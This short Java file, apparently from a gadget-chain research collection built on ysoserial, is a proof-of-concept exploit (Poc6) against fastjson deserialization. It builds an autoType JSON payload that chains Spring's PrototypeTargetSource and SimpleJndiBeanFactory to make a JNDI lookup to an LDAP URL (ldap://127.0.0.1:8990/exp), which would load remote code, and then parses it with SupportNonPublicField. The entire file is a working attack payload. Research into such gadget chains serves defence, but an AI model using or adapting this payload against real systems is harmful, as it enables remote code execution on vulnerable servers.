package ysoserial.payloads.tabbyGadgetChains.Spring;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;

public class Poc6 {
    public static void main(String[] args) {
        //3
        String poc = "{\"@type\":\"Lorg.springframework.aop.target.PrototypeTargetSource;\",\"targetBeanName\":\"ldap://127.0.0.1:8990/exp\",\"beanFactory\":{\"@type\":\"Lorg.springframework.jndi.support.SimpleJndiBeanFactory;\"}}";
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
